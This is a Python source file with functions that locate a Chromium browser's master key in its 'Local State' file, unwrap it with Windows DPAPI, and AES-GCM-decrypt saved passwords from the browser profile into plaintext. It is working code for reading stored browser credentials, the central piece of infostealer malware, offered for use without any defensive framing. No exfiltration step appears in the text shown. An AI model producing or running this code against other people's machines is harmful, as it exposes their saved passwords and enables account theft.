import os
import json
import base64
import sqlite3
import shutil
from datetime import datetime, timedelta
import win32crypt
from Crypto.Cipher import AES

def get_master_key(path):
    """Retrieves the master key used to decrypt passwords in Chromium browsers."""
    if not os.path.exists(path):
        return None
    
    try:
        with open(path, "r", encoding="utf-8") as f:
            local_state = json.load(f)

        encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        
        # Check for DPAPI prefix (it's often 'DPAPI')
        if encrypted_key.startswith(b'DPAPI'):
            encrypted_key = encrypted_key[5:]
            
        master_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
        return master_key
    except Exception as e:
        print(f"Error retrieving master key: {e}")
        return None

def decrypt_password(buff, master_key):
    """Decrypts a password using the master key (v10/v20) or direct DPAPI."""
    if not buff:
        return ""
        
    try:
        # Modern Chromium encryption (v10 / v11 / v20)
        # v20 is App-Bound Encryption (Chrome 127+)
        if buff.startswith(b'v10') or buff.startswith(b'v11') or buff.startswith(b'v20'):
            if master_key is None:
                return "Error: Master key not found (Check Local State)"
                
            iv = buff[3:15]
            payload = buff[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            try:
                decrypted_pass = cipher.decrypt(payload)
                # Remove the 16-byte tag from the end
                decrypted_pass = decrypted_pass[:-16]
                return decrypted_pass.decode('utf-8')
            except Exception:
                if buff.startswith(b'v20'):
                    return "Protected: Chrome v20 App-Bound Encryption (Locked by OS)"
                raise
        else:
            # Legacy DPAPI encryption or unrecognized format
            try:
                return win32crypt.CryptUnprotectData(buff, None, None, None, 0)[1].decode('utf-8', errors='replace')
            except Exception as dpapi_e:
                prefix = buff[:10].hex()
                return f"Error: DPAPI failed ({dpapi_e}). Prefix: {prefix}"
    except Exception as e:
        return f"Error: {str(e)}"

def chrome_date_to_datetime(chrome_date):
    """Converts a Chrome timestamp to a human-readable datetime."""
    return datetime(1601, 1, 1) + timedelta(microseconds=chrome_date)
